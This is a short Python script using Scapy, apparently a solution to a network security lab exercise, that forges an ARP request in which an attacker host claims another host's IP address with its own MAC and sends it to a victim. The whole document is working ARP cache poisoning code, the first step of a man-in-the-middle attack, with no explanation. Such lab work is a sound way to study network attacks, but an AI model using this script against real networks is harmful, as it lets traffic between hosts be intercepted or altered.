#!/usr/bin/env python3
from scapy.all import *

# Who can it be used? Write first!
A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

E = Ether(src=M_mac, dst=A_mac)
A = ARP(hwsrc=M_mac, psrc=B_ip,
        hwdst=A_mac, pdst=A_ip)
A.op = 1 	# 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)
